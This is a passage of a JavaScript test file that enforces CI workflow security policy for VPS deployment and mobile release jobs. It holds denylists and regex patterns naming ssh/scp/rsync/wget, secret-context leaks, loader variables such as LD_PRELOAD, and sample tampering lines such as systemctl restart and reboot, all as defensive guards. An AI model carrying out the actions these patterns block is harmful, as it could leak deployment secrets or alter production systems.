import assert from 'node:assert/strict';
import { execFileSync, spawn, spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import http from 'node:http';
import { tmpdir } from 'node:os';
import { isDeepStrictEqual } from 'node:util';
import { join, resolve } from 'node:path';
import test from 'node:test';
import yaml from 'js-yaml';
import { evaluateGate } from '../../scripts/deploy/ci-gate.mjs';

const ROOT = resolve(import.meta.dirname, '../..');
const WORKFLOWS = join(ROOT, '.github/workflows');
const GATE = join(ROOT, 'scripts/deploy/ci-gate.mjs');

// ---- workflow policy -------------------------------------------------------------------------

// Minimal line-based split of `jobs:` into { name -> block text } (no YAML dependency is declared:
// js-yaml is only transitive). FAIL-CLOSED: anything this parser does not positively recognise throws,
// so a quoted/odd job id or unusual structure can never hide a job from the policy below.
function splitWorkflow(rawText) {
  const lines = rawText.replace(/\r\n/g, '\n').split('\n');
  const starts = lines.flatMap((line, i) => (/^jobs\s*:/.test(line) ? [i] : []));
  if (starts.length !== 1 || !/^jobs:\s*(#.*)?$/.test(lines[starts[0]])) throw Error('workflow must have exactly one plain "jobs:" mapping');
  const jobs = {};
  const outside = lines.slice(0, starts[0] + 1); // everything that is not inside a job: header, on:, env:, permissions: ...
  let current = null;
  let i = starts[0] + 1;
  for (; i < lines.length; i += 1) {
    const line = lines[i];
    if (/^\S/.test(line)) break; // next top-level key
    if (/^\s*(#.*)?$/.test(line)) { if (current) jobs[current].push(line); else outside.push(line); continue; }
    if (/\t/.test(line.match(/^\s*/)[0])) throw Error('tab indentation inside jobs: is not supported: ' + line);
    const indent = line.match(/^ */)[0].length;
    if (indent === 2) {
      const key = /^ {2}([A-Za-z_][A-Za-z0-9_-]*):\s*(#.*)?$/.exec(line);
      if (!key) throw Error('unrecognised job key (quoted, flow-style or inline): ' + line);
      if (Object.hasOwn(jobs, key[1])) throw Error('duplicate job id: ' + key[1]);
      current = key[1]; jobs[current] = [];
      outside.push(line);
    } else if (indent < 2 || current === null) {
      throw Error('unexpected indentation under jobs: ' + line);
    } else jobs[current].push(line);
  }
  outside.push(...lines.slice(i));
  if (!Object.keys(jobs).length) throw Error('no jobs recognised');
  return { jobs: Object.fromEntries(Object.entries(jobs).map(([k, v]) => [k, v.join('\n')])), outside: outside.join('\n') };
}
const jobsOf = rawText => splitWorkflow(rawText).jobs;

// Job-level properties (indent 4) only; step-level keys such as an "env: needs: ..." never count.
function jobProps(block) {
  const props = {};
  let cur = null;
  for (const line of block.split('\n')) {
    if (/^\s*(#.*)?$/.test(line)) { if (cur) props[cur].push(line); continue; }
    const indent = line.match(/^ */)[0].length;
    if (indent === 4) {
      const m = /^ {4}([A-Za-z_][A-Za-z0-9_-]*):(.*)$/.exec(line);
      if (!m) throw Error('unrecognised job property: ' + line);
      if (Object.hasOwn(props, m[1])) throw Error('duplicate job property: ' + m[1]);
      cur = m[1]; props[cur] = [m[2]];
    } else if (indent > 4 && cur) props[cur].push(line);
    else throw Error('unexpected indentation in job: ' + line);
  }
  return Object.fromEntries(Object.entries(props).map(([k, v]) => [k, v.join('\n')]));
}
const needsList = value => value.replace(/#.*$/gm, '').replace(/^\s*-\s+/gm, ' ').replace(/[[\],]/g, ' ').split(/\s+/).filter(Boolean);

// Read-only exceptions. Each entry must stay justified: it may not apply, push, or change state on the VPS.
const READ_ONLY_ALLOWLIST = {
  'diagnose-vps-release.yml': {
    jobs: ['diagnose'],
    reason: 'workflow_dispatch diagnosis only prints release integrity (hash compare, systemctl is-active); it applies nothing.',
    // SECURITY BOUNDARY = this pin. The whole job text (ssh command + remote script) is locked by sha256;
    // any edit fails the test until Lead + Codex re-review the read-only claim and the hash is updated.
    pinnedSha256: '9d2f6d627082c8b525dd78ca1d48abdc0ee05456813b30305ba3a2091e4ec4e7',
    // Secondary layer ONLY, NOT a security boundary (a denylist cannot prove read-only; e.g. subprocess lists,
    // open(...,'w'), docker, reboot all slip past). It only gives a friendlier hint on obvious mistakes.
    forbidden: /\b(systemctl\s+(restart|start|stop|reload|enable|disable)|rm\s|mv\s|ln\s+-s|chmod|chown|unlink|write_|os\.(remove|rename|system)|shutil|\.mkdir|tar\s+-?x|pg_|psql|python3\s+-B\s+\S*vps-update|cp\s|tee\s|>\s*\/(opt|etc|root))/,
  },
};

const jobSha256 = block => createHash('sha256').update(block.replace(/\r\n/g, '\n').trimEnd() + '\n').digest('hex');

function assertPinnedReadOnly(file, name, block, allow) {
  assert.equal(jobSha256(block), allow.pinnedSha256,
    `${file}:${name} diagnose job changed: requires Lead + Codex re-review of read-only claim, then update the pinned hash (${allow.reason})`);
  assert.doesNotMatch(block.split(/<<'PY'/).slice(1).join(''), allow.forbidden, `${file}:${name} contains an obviously state-changing command (secondary denylist)`);
}

test('diagnose read-only pin: any edit to the job fails, including state-changing calls the denylist misses', () => {
  const allow = READ_ONLY_ALLOWLIST['diagnose-vps-release.yml'];
  const block = jobsOf(readFileSync(join(WORKFLOWS, 'diagnose-vps-release.yml'), 'utf8')).diagnose;
  assert.ok(block, 'diagnose job exists');
  assertPinnedReadOnly('diagnose-vps-release.yml', 'diagnose', block, allow);
  assertPinnedReadOnly('diagnose-vps-release.yml', 'diagnose', block.replace(/\r?\n/g, '\r\n'), allow); // CRLF checkout is the same job
  const inserted = [
    "subprocess.run(['systemctl','restart','x'])",
    "open('/etc/11ship/x','w').write('1')",
    "Path('/etc/x').write_text('1')",
    "subprocess.run(['reboot'])",
    "subprocess.run(['docker','rm','x'])",
  ];
  for (const line of inserted) {
    const tampered = block.replace("          print('target: '+str(target))", `          ${line}\n          print('target: '+str(target))`);
    assert.notEqual(tampered, block, 'insertion point exists');
    assert.throws(() => assertPinnedReadOnly('diagnose-vps-release.yml', 'diagnose', tampered, allow), /diagnose job changed: requires Lead \+ Codex re-review/, line);
  }
  // A comment-only edit is also a change that needs re-review.
  assert.throws(() => assertPinnedReadOnly('diagnose-vps-release.yml', 'diagnose', block + '    # x\n', allow), /diagnose job changed/);
});

// ---- closed topology -----------------------------------------------------------------------
// SECURITY BOUNDARY for real is the Owner's GitHub configuration: the SSH secret lives ONLY in environment
// vps-production, whose deployment branches are limited to main (optionally with a required reviewer).
// The checks below are a DETECTION layer: they keep every other workflow away from the VPS and pin the
// two places that may touch it. Nothing here proves the GitHub settings (NOT TESTED until the Owner sets them).
//
//  * Only deploy-vps.yml:deploy and diagnose-vps-release.yml:diagnose may declare an environment pointing at
//    vps-production (any spelling/case); every other workflow may declare no `environment` at all.
//  * Only those two jobs may mention VPS_* secrets/vars. No workflow may hand over the whole secrets
//    context (toJSON(secrets), secrets[...], ${{ secrets }}).
//  * No other workflow may use ssh/scp/rsync/sftp (any path), secrets: inherit, a local reusable
//    workflow/composite action, or scripts/deploy/* beyond: node build-ubuntu-artifact.mjs /
//    verify-ubuntu-artifact.mjs (offline build/verify) and node check-app-compat.mjs with --static only
//    (--live and --after make network calls and are NOT exempt).
//  * deploy-vps.yml has exactly the jobs ci-gate (pinned by sha256) and deploy (job-level needs ci-gate,
//    no always()/failure()/cancelled() in its job-level if, matched case-insensitively).
const SENSITIVE = /vps_|vps-production|\bssh\b|\bscp\b|\brsync\b|\bsftp\b|secrets:\s*inherit|uses:\s*\.\/|github-vps-|vps-diagnose|recover-6270/i;
// Whole-context secret access (the dot form secrets.NAME is fine).
const SECRETS_CONTEXT = /tojson\s*\(\s*secrets\b|\bsecrets\s*\[|\bsecrets\s*\}\}|\(\s*secrets\s*[,)]|,\s*secrets\s*[,)]/i;
const SAFE_NODE_SCRIPTS = ['check-app-compat.mjs', 'build-ubuntu-artifact.mjs', 'verify-ubuntu-artifact.mjs'];
const CI_GATE_PINNED_SHA256 = 'fb9340b2e5d610b291e788a0970792263aa127d77f3a08b325217f8b2f35343e';
// M14 gateway upgrade workflow (same ci-gate job, pinned; its `gateway` job is pinned by sha256 so any edit needs Lead + Codex re-review).
const M14_GATEWAY_FILE = 'deploy-m14-gateway.yml';
const M14_GATEWAY_JOB_PINNED_SHA256 = 'c1a4f38cc714f9472f58abb4726a26cbbad1315eaa71d53e229df9a05a3ab742';

function unsafeReferences(text) {
  const out = [];
  const hit = SENSITIVE.exec(text);
  if (hit) out.push(`mentions "${hit[0]}"`);
  const ctx = SECRETS_CONTEXT.exec(text);
  if (ctx) out.push(`passes the whole secrets context ("${ctx[0]}")`);
  for (const m of text.matchAll(/scripts\/deploy(?!\/)/g)) out.push(`bare scripts/deploy reference at ${m.index}`);
  for (const m of text.matchAll(/scripts\/deploy\/([^\s"']*)/g)) {
    const before = text.slice(Math.max(0, m.index - 5), m.index);
    if (before !== 'node ' || !SAFE_NODE_SCRIPTS.includes(m[1])) { out.push(`calls scripts/deploy/${m[1]} (not an allowed "node" build/verify script)`); continue; }
    if (m[1] === 'check-app-compat.mjs') {
      const rest = text.slice(m.index + m[0].length).split('\n', 1)[0];
      if (rest.trim() !== '--static') out.push(`calls check-app-compat.mjs without exactly --static ("${rest.trim()}")`);
    }
  }
  return out;
}

function deployJobViolations(block) {
  const props = jobProps(block);
  const out = [];
  if (!needsList(props.needs ?? '').includes('ci-gate')) out.push('deploy job must have a job-level needs containing ci-gate');
  if (props.if !== undefined && /\b(always|failure|cancelled)\s*\(/i.test(props.if)) out.push('deploy job-level if must not use always()/failure()/cancelled()');
  if (!/vps-production/i.test(props.environment ?? '')) out.push('deploy job must declare environment vps-production');
  return out;
}

// Owner-approved narrow exception (STORE-01 PR-A, #344): the manual Play AAB release may declare environment android-release.
// Only this exact file, job id, environment and shape pass; everything else in the file is held to the strictest rules below.
const AAB_RELEASE = { file: 'mobile-aab-release.yml', job: 'aab', environment: 'android-release', runsOn: 'ubuntu-24.04', ifRef: "github.ref == 'refs/heads/main'" };
const AAB_JOB_KEYS = ['name', 'if', 'runs-on', 'timeout-minutes', 'environment', 'steps'];
// Every action the AAB job may use, pinned by full 40-hex commit SHA (the tag in the workflow comment is for humans only).
// Verified against GitHub on 14/11/2026: actions/checkout v4.4.0, actions/setup-java v4.9.1, subosito/flutter-action v2.23.0,
// actions/upload-artifact v4.6.2. Any other action, tag, branch, short SHA or docker:// reference fails the guard.
const AAB_ACTIONS = {
  'actions/checkout': '11d5960a326750d5838078e36cf38b85af677262',
  'actions/setup-java': 'cf277c60eb25467037889841efdb72551f06f6c3',
  'subosito/flutter-action': '1a449444c387b1966244ae4d4f8c696479add0b2',
  'actions/upload-artifact': 'ea165f8d65b6e75b540449e92b4886f43607fa02',
};

// The lines under a top-level key (up to the next line at column 0).
function blockAfter(text, key) {
  const lines = text.replace(/\r\n/g, '\n').split('\n');
  const start = lines.findIndex(l => new RegExp(`^${key}:\\s*(#.*)?$`).test(l));
  if (start < 0) return null;
  const body = [];
  for (let i = start + 1; i < lines.length && !/^\S/.test(lines[i]); i += 1) body.push(lines[i]);
  return body;
}

// The keys directly under a block (indent 2). null when anything is not a plain key (flow style, list, scalar), so it fails closed.
function childKeys(body) {
  if (body === null) return null;
  const keys = [];
  for (const line of body) {
    if (/^\s*(#.*)?$/.test(line)) continue;
    const indent = line.match(/^ */)[0].length;
    if (indent !== 2) continue;
    const m = /^ {2}([A-Za-z_][A-Za-z0-9_-]*):\s*(#.*)?$/.exec(line);
    if (!m) return null;
    keys.push(m[1]);
  }
  return keys;
}

// A step may have ONLY these keys. No id, if, continue-on-error, working-directory or timeout in any step of the release job.
const AAB_STEP_KEYS = ['name', 'uses', 'with', 'run', 'env', 'shell'];
// The approved shape of the release job (Codex, PR #351). Every change to the steps must change this golden file in the same review.
const AAB_GOLDEN = JSON.parse(readFileSync(join(ROOT, 'tests/deploy/fixtures/mobile-aab-release.golden.json'), 'utf8'));
// Steps allowed to write a value into the job environment for later steps. Only public values; none of them touches a secret.
const AAB_SETUP_ENV_STEPS = ['Source matches the run commit', 'App identity and version (pubspec.yaml)', 'Central endpoints (config/endpoints.json)'];

// The step as the golden stores it: only the keys present, run replaced by the SHA-256 of its script.
function canonicalSteps(steps) {
  return steps.map(s => {
    const o = {};
    if (s.name !== undefined) o.name = s.name;
    for (const key of ['uses', 'with', 'env', 'shell']) if (s[key] !== undefined) o[key] = s[key];
    // A run that is not a string (a YAML boolean, a number, a mapping) can never match the golden: it is kept visibly invalid.
    if (s.run !== undefined) o.run = typeof s.run === 'string' ? 'sha256:' + createHash('sha256').update(s.run).digest('hex') : 'INVALID-RUN';
    return o;
  });
}
const AAB_SIGN_STEP = 'Sign the bundle with the upload key (single signer)';
const AAB_UPLOAD_SECRETS = ['ANDROID_UPLOAD_KEYSTORE_BASE64', 'ANDROID_UPLOAD_KEYSTORE_PASSWORD', 'ANDROID_UPLOAD_KEY_ALIAS', 'ANDROID_UPLOAD_KEY_PASSWORD'];
const AAB_SECRETS_OK = [...AAB_UPLOAD_SECRETS, 'FCM_SHIP_API_KEY', 'FCM_FOOD_API_KEY'];
const AAB_VARS_OK = ['ANDROID_APP_SIGNER_SHA256', 'ANDROID_UPLOAD_CERT_SHA256', 'FCM_PROJECT_ID', 'FCM_SENDER_ID', 'FCM_SHIP_APP_ID', 'FCM_FOOD_APP_ID'];
const AAB_SCRIPTS_OK = ['mobile/tool/app-version.sh', 'mobile/tool/prepare-android.sh', 'mobile/tool/sign-aab.sh', 'mobile/tool/check-aab-release.py'];
const AAB_BUNDLETOOL_URL = 'https://github.com/google/bundletool/releases/download/1.18.3/bundletool-all-1.18.3.jar';

// Visits every mapping key (at any depth) with its value.
function walkYaml(node, visit) {
  if (Array.isArray(node)) node.forEach(item => walkYaml(item, visit));
  else if (node && typeof node === 'object') {
    for (const [key, value] of Object.entries(node)) { visit(key, value); walkYaml(value, visit); }
  }
}

// Every token that names a shell script (ends in .sh) in a run step must be the argument right after `bash`, and `bash` must be the
// command word of its segment (only NAME=value assignments may precede it). Anything else is a violation (fail closed).
export function shellScriptViolations(script) {
  const out = [];
  // Command separators: newline ; & | ( ) < > ` { } — so `$(`, `${`, subshells and pipelines start a new command.
  for (const segment of script.split(/[\n;&|()<>`{}]/)) {
    const tokens = segment.split(/\s+/).map(t => t.replace(/["'\\]/g, '')).filter(Boolean);
    let head = 0;
    while (head < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[head])) head++;
    tokens.forEach((token, j) => {
      if (!token.endsWith('.sh')) return;
      const ok = tokens[head] === 'bash' && j === head + 1;
      if (!ok) out.push(`a shell script must be started by bash (found "${token}")`);
    });
  }
  return out;
}

// STRUCTURAL guard for the AAB workflow (Antigravity, PR #351): the file is parsed with js-yaml and the parsed tree is checked, so a
// flow-style step, a quoted key, or a `uses` at any depth cannot hide from a line-based regex. Anything unusual fails closed.
function aabParsedViolations(text) {
  const out = [];
  const add = reason => out.push(`${AAB_RELEASE.file}: ${reason}`);
  // Raw shapes that js-yaml would accept but this guard refuses: several documents, anchors, aliases, merge keys, tags, flow collections.
  if (/^(---|\.\.\.)\s*$/m.test(text)) add('multiple or explicit YAML documents are not allowed');
  if (/(?:^|[:\-\[{,]\s*)[&*][A-Za-z0-9_-]+(?=\s|$|[,\]}])/m.test(text)) add('YAML anchors and aliases are not allowed');
  if (/<<\s*:/.test(text)) add('YAML merge keys are not allowed');
  if (/(?:^|[:\-\[{,]\s*)![!<A-Za-z][^\s]*/m.test(text)) add('YAML tags are not allowed');
  if (/^\s*-\s*[\[{]/m.test(text) || /^\s*(?:"[^"\n]*"|'[^'\n]*'|[A-Za-z0-9_.-]+)\s*:\s*[\[{]/m.test(text)) add('flow-style collections are not allowed (block YAML only)');
  let doc;
  try { doc = yaml.load(text); } catch (error) { add(`YAML cannot be parsed (fail closed): ${String(error.message).split('\n')[0]}`); return out; }
  if (!doc || typeof doc !== 'object' || Array.isArray(doc)) { add('the document is not a mapping'); return out; }
  for (const key of Object.keys(doc)) if (!['name', 'on', 'concurrency', 'permissions', 'defaults', 'jobs'].includes(key)) add(`top-level key outside the allowlist: ${key}`);
  if (!doc.on || typeof doc.on !== 'object' || JSON.stringify(Object.keys(doc.on)) !== '["workflow_dispatch"]') add('the only trigger is workflow_dispatch');
  if (JSON.stringify(doc.permissions ?? null) !== JSON.stringify({ contents: 'read' })) add('permissions must be exactly contents: read');
  const jobs = doc.jobs && typeof doc.jobs === 'object' ? doc.jobs : {};
  if (JSON.stringify(Object.keys(jobs)) !== JSON.stringify([AAB_RELEASE.job])) add(`must have exactly the job ${AAB_RELEASE.job}`);
  const job = jobs[AAB_RELEASE.job] ?? {};
  for (const key of Object.keys(job)) if (!AAB_JOB_KEYS.includes(key)) add(`job key outside the allowlist: ${key}`);
  if (job.environment !== AAB_RELEASE.environment) add(`environment must be exactly ${AAB_RELEASE.environment}`);
  if (job.if !== AAB_RELEASE.ifRef) add(`the job must be restricted to ${AAB_RELEASE.ifRef}`);
  if (job['runs-on'] !== AAB_RELEASE.runsOn) add(`runs-on must be ${AAB_RELEASE.runsOn}`);
  if (!Array.isArray(job.steps)) add('steps must be a block sequence');
  else job.steps.forEach((step, index) => {
    if (!step || typeof step !== 'object' || Array.isArray(step)) { add(`step ${index} is not a mapping`); return; }
    for (const key of Object.keys(step)) if (!AAB_STEP_KEYS.includes(key)) add(`step ${index} key outside the allowlist: ${key}`);
  });
  // PRIMARY CHECK (Codex, PR #351): the whole shape of the job, compared to the approved golden: list, order, names, uses, with, env,
  // shell and the SHA-256 of every run script. Any change must update tests/deploy/fixtures/mobile-aab-release.golden.json in the same review.
  if (Array.isArray(job.steps) && !isDeepStrictEqual(canonicalSteps(job.steps), AAB_GOLDEN.steps)) {
    const actual = canonicalSteps(job.steps);
    const names = actual.map(s => s.name ?? '(unnamed)');
    const expected = AAB_GOLDEN.steps.map(s => s.name ?? '(unnamed)');
    add(`the job steps differ from the approved golden (update tests/deploy/fixtures/mobile-aab-release.golden.json in the same change). `
      + `actual [${names.join(' | ')}]; golden [${expected.join(' | ')}]`);
  }
  // Job-wide rules, independent of the golden: the four GITHUB_* channels that can carry a value out of a step are closed, except the
  // environment file for the three public setup steps; the record and signing steps read no environment variable and write none.
  if (Array.isArray(job.steps)) for (const step of job.steps) {
    const script = typeof step?.run === 'string' ? step.run : '';
    if (/GITHUB_(OUTPUT|PATH|STEP_SUMMARY)\b/.test(script)) add(`step "${step.name}" writes a GITHUB_OUTPUT, GITHUB_PATH or GITHUB_STEP_SUMMARY channel (closed)`);
    if (/GITHUB_ENV\b/.test(script) && !AAB_SETUP_ENV_STEPS.includes(step.name)) add(`step "${step.name}" writes GITHUB_ENV (only the public setup steps may)`);
    if (/\b(os\.environ|getenv\(|process\.env|\$\{?ENV)/.test(script)) add(`step "${step.name}" reads an environment variable from code (indirect reading closed)`);
  }
  // Every uses key at ANY depth (steps, job, with, quoted keys, nested mappings): an allowed action pinned by its full SHA, or FAIL.
  walkYaml(doc, (key, value) => {
    if (key !== 'uses') return;
    const pin = typeof value === 'string' ? /^([A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+)@([0-9a-f]{40})$/.exec(value) : null;
    if (!pin || AAB_ACTIONS[pin[1]] !== pin[2]) add(`uses "${String(value)}" is not an allowed action pinned by its full 40-hex SHA`);
  });
  // run scripts: no remote control, no VPS, no git write, only approved repo scripts, curl only for the pinned bundletool URL.
  walkYaml(doc, (key, value) => {
    if (key !== 'run' || typeof value !== 'string') return;
    for (const bad of [/\bgh\s/, /\bssh\b/, /\bscp\b/, /\brsync\b/, /\bwget\b/, /\bgit\s+(push|tag|remote|fetch)\b/, /scripts\/deploy/]) {
      if (bad.test(value)) add(`a run step uses a forbidden command (${bad.source})`);
    }
    // The Android XML namespace string is data read by the release record, not a request; any real fetch is refused.
    for (const url of value.matchAll(/https?:\/\/[A-Za-z0-9][^\s'"),};<>]*/g)) {
      if (url[0] !== AAB_BUNDLETOOL_URL && url[0] !== 'http://schemas.android.com/apk/res/android') add(`a run step contacts an unapproved URL: ${url[0]}`);
    }
    if (/\b(urlopen|urllib|requests\.|http\.client|socket\.)/.test(value)) add('run steps may not open network connections from Python');
    for (const line of value.split('\n')) if (/\bcurl\b/.test(line) && !line.includes(AAB_BUNDLETOOL_URL)) add('curl is allowed only for the pinned bundletool URL');
    for (const found of value.matchAll(/\b(mobile\/tool\/[A-Za-z0-9_.-]+|scripts\/[A-Za-z0-9_./-]+|tests\/[A-Za-z0-9_./-]+)/g)) {
      if (!AAB_SCRIPTS_OK.includes(found[1])) add(`a run step calls an unapproved script: ${found[1]}`);
    }
    // Shell scripts run through bash only (hotfix after PR #351: mobile/tool/app-version.sh is mode 644 in git, so a direct call fails
    // with "Permission denied"). Fail closed: every token that names a .sh file must be the argument right after the word bash, and bash
    // must be the command word of its own segment (after optional NAME=value assignments). Quotes, path prefixes, $( ), and `${ }` are
    // all covered because the token is judged after stripping quotes and splitting on command separators.
    for (const bad of shellScriptViolations(value)) add(bad);
  });
  // Shell and environment: only the runner's bash, and no variable that makes an interpreter load code from elsewhere.
  walkYaml(doc, (key, value) => {
    if (key === 'shell' && value !== 'bash') add(`shell must be bash, not ${JSON.stringify(value)} (a custom shell line can run any command)`);
    if (key === 'env' && value && typeof value === 'object') {
      for (const name of Object.keys(value)) {
        if (/^(BASH_ENV|ENV|LD_PRELOAD|LD_LIBRARY_PATH|PATH|NODE_OPTIONS|PYTHONPATH|PYTHONSTARTUP|GIT_SSH_COMMAND|BASH_FUNC_.*)$/.test(name)) add(`environment variable ${name} is not allowed in a step`);
      }
    }
  });
  walkYaml(doc, (key, value) => {
    if (key === 'run' && typeof value === 'string' && /\b(BASH_ENV|LD_PRELOAD|NODE_OPTIONS|PYTHONPATH|PYTHONSTARTUP|GIT_SSH_COMMAND|GITHUB_PATH)\b/.test(value)) {
      add('a run step may not set an interpreter or loader variable');
    }
  });
  // Secrets and variables, per step: only the four upload secrets, and only in the signing step; FCM secrets only where they are used.
  for (const step of Array.isArray(job.steps) ? job.steps : []) {
    if (!step || typeof step !== 'object') continue;
    const stepText = JSON.stringify(step);
    for (const [, name] of stepText.matchAll(/secrets\.([A-Za-z0-9_]+)/g)) {
      if (!AAB_SECRETS_OK.includes(name)) add(`secret not allowed in the release job: ${name}`);
      if (AAB_UPLOAD_SECRETS.includes(name) && step.name !== AAB_SIGN_STEP) add(`upload-key secret outside the signing step: ${name}`);
    }
    for (const [, name] of stepText.matchAll(/vars\.([A-Za-z0-9_]+)/g)) if (!AAB_VARS_OK.includes(name)) add(`variable not allowed in the release job: ${name}`);
  }
  return out;
}

function aabReleaseViolations(text, jobs) {
  const f = AAB_RELEASE.file;
  const out = [];
  const add = reason => out.push(`${f}: ${reason}`);
  const names = Object.keys(jobs);
  if (names.length !== 1 || names[0] !== AAB_RELEASE.job) add(`must have exactly the job ${AAB_RELEASE.job} (found ${names.join(', ')})`);
  if (/^---/m.test(text)) add('must be a single YAML document');
  // Anchors, aliases and merge keys can reuse or hide a value (an environment, a job, a trigger): none are allowed.
  if (/:\s*[&*][A-Za-z0-9_-]/.test(text) || /^\s*-\s*[&*][A-Za-z0-9_-]/m.test(text) || /<<\s*:/.test(text)) add('YAML anchors, aliases and merge keys are not allowed');
  if ((text.match(/^\s*environment\s*:/gm) ?? []).length !== 1) add('exactly one environment declaration is allowed');
  const triggers = childKeys(blockAfter(text, 'on'));
  if (JSON.stringify(triggers) !== JSON.stringify(['workflow_dispatch'])) add(`the only trigger is workflow_dispatch (found ${JSON.stringify(triggers)})`);
  if (/:\s*write(-all)?\b|write-all/.test(text)) add('no write permission');
  if (/\bgh\s+(workflow|api|run)\b|workflow_run|repository_dispatch|workflow_call|deploy-vps|diagnose-vps|ci-gate|\bself-hosted\b/i.test(text)) add('must not trigger or call another workflow, or use a self-hosted runner');
  if (!text.includes('if [ "$GITHUB_REF" != "refs/heads/main" ]; then')) add('a step must refuse any ref other than main');
  // Structure, uses at any depth, run commands and secrets: checked on the PARSED tree, fail closed (see aabParsedViolations).
  out.push(...aabParsedViolations(text));
  const job = jobs[AAB_RELEASE.job];
  if (job !== undefined) {
    const props = jobProps(job);
    const extra = Object.keys(props).filter(k => !AAB_JOB_KEYS.includes(k));
    if (extra.length) add(`job keys outside the allowlist (a reusable workflow, secrets or a second environment would show here): ${extra.join(', ')}`);
    if ((props.environment ?? '').trim() !== AAB_RELEASE.environment) add(`environment must be exactly ${AAB_RELEASE.environment}`);
    if ((props.if ?? '').trim() !== AAB_RELEASE.ifRef) add(`the job must be restricted to ${AAB_RELEASE.ifRef}`);
    if ((props['runs-on'] ?? '').trim() !== AAB_RELEASE.runsOn) add(`runs-on must be ${AAB_RELEASE.runsOn} (no self-hosted runner)`);
    out.push(...unsafeReferences(job).map(r => `${f}:${AAB_RELEASE.job} ${r}`));
  }
  return out;
}

// Owner-approved narrow exception (G3, iOS): the manual TestFlight build may declare environment ios-release. Same discipline as the AAB release: one file,
// one job, exact trigger/ref/runner/environment, pinned actions, a golden of every step, secrets only on the two steps that need them.
const IOS_RELEASE = { file: 'mobile-ios-release.yml', job: 'testflight', environment: 'ios-release', runsOn: 'macos-26', ifRef: "github.ref == 'refs/heads/main'" };
const IOS_GOLDEN = JSON.parse(readFileSync(join(ROOT, 'tests/deploy/fixtures/mobile-ios-release.golden.json'), 'utf8'));
const IOS_UPLOAD_STEP = 'Build, sign and upload to TestFlight (the only step with the API key)';
const IOS_PREPARE_STEP = 'Prepare the iOS project (push must be on for a release)';
const IOS_SECRETS = { IOS_ASC_KEY_P8_BASE64: [IOS_UPLOAD_STEP], FCM_SHIP_IOS_API_KEY: [IOS_PREPARE_STEP], FCM_FOOD_IOS_API_KEY: [IOS_PREPARE_STEP] };
const IOS_VARS_OK = ['IOS_ASC_KEY_ID', 'IOS_ASC_ISSUER_ID', 'IOS_TEAM_ID', 'FCM_PROJECT_ID', 'FCM_SENDER_ID', 'FCM_SHIP_IOS_APP_ID', 'FCM_FOOD_IOS_APP_ID'];
const IOS_SCRIPTS_OK = ['mobile/tool/app-version.sh', 'mobile/tool/prepare-ios.sh', 'mobile/tool/ios-testflight.sh'];
const IOS_SETUP_ENV_STEPS = ['Source matches the run commit', 'App identity and version (pubspec.yaml)', 'Central endpoints (config/endpoints.json)'];

function iosReleaseViolations(text) {
  const out = [];
  const add = reason => out.push(`${IOS_RELEASE.file}: ${reason}`);
  if (/^(---|\.\.\.)\s*$/m.test(text)) add('multiple or explicit YAML documents are not allowed');
  if (/(?:^|[:\-\[{,]\s*)[&*][A-Za-z0-9_-]+(?=\s|$|[,\]}])/m.test(text)) add('YAML anchors and aliases are not allowed');
  if (/<<\s*:/.test(text)) add('YAML merge keys are not allowed');
  if (/(?:^|[:\-\[{,]\s*)![!<A-Za-z][^\s]*/m.test(text)) add('YAML tags are not allowed');
  if (/^\s*-\s*[\[{]/m.test(text) || /^\s*(?:"[^"\n]*"|'[^'\n]*'|[A-Za-z0-9_.-]+)\s*:\s*[\[{]/m.test(text)) add('flow-style collections are not allowed (block YAML only)');
  if (/\bworkflow_run|repository_dispatch|workflow_call|deploy-vps|diagnose-vps|ci-gate|\bself-hosted\b/i.test(text)) add('must not trigger or call another workflow, or use a self-hosted runner');
  if ((text.match(/^\s*environment\s*:/gm) ?? []).length !== 1) add('exactly one environment declaration is allowed');
  if (!text.includes('if [ "$GITHUB_REF" != "refs/heads/main" ]; then')) add('a step must refuse any ref other than main');
  let doc;
  try { doc = yaml.load(text); } catch (error) { add(`YAML cannot be parsed (fail closed): ${String(error.message).split('\n')[0]}`); return out; }
  if (!doc || typeof doc !== 'object' || Array.isArray(doc)) { add('the document is not a mapping'); return out; }
  for (const key of Object.keys(doc)) if (!['name', 'on', 'concurrency', 'permissions', 'defaults', 'jobs'].includes(key)) add(`top-level key outside the allowlist: ${key}`);
  if (!doc.on || typeof doc.on !== 'object' || JSON.stringify(Object.keys(doc.on)) !== '["workflow_dispatch"]') add('the only trigger is workflow_dispatch');
  if (JSON.stringify(doc.permissions ?? null) !== JSON.stringify({ contents: 'read' })) add('permissions must be exactly contents: read');
  const jobs = doc.jobs && typeof doc.jobs === 'object' ? doc.jobs : {};
  if (JSON.stringify(Object.keys(jobs)) !== JSON.stringify([IOS_RELEASE.job])) add(`must have exactly the job ${IOS_RELEASE.job}`);
  const job = jobs[IOS_RELEASE.job] ?? {};
  for (const key of Object.keys(job)) if (!AAB_JOB_KEYS.includes(key)) add(`job key outside the allowlist: ${key}`);
  if (job.environment !== IOS_RELEASE.environment) add(`environment must be exactly ${IOS_RELEASE.environment}`);
  if (job.if !== IOS_RELEASE.ifRef) add(`the job must be restricted to ${IOS_RELEASE.ifRef}`);
  if (job['runs-on'] !== IOS_RELEASE.runsOn) add(`runs-on must be ${IOS_RELEASE.runsOn}`);
  const steps = Array.isArray(job.steps) ? job.steps : [];
  if (!Array.isArray(job.steps)) add('steps must be a block sequence');
  steps.forEach((step, index) => {
    if (!step || typeof step !== 'object' || Array.isArray(step)) { add(`step ${index} is not a mapping`); return; }
    for (const key of Object.keys(step)) if (!AAB_STEP_KEYS.includes(key)) add(`step ${index} key outside the allowlist: ${key}`);
  });
  if (Array.isArray(job.steps) && !isDeepStrictEqual(canonicalSteps(job.steps), IOS_GOLDEN.steps)) {
    add('the job steps differ from the approved golden (update tests/deploy/fixtures/mobile-ios-release.golden.json in the same change)');
  }
  for (const step of steps) {
    const script = typeof step?.run === 'string' ? step.run : '';
    if (/GITHUB_(OUTPUT|PATH|STEP_SUMMARY)\b/.test(script)) add(`step "${step.name}" writes a GITHUB_OUTPUT, GITHUB_PATH or GITHUB_STEP_SUMMARY channel (closed)`);
    if (/GITHUB_ENV\b/.test(script) && !IOS_SETUP_ENV_STEPS.includes(step.name)) add(`step "${step.name}" writes GITHUB_ENV (only the public setup steps may)`);
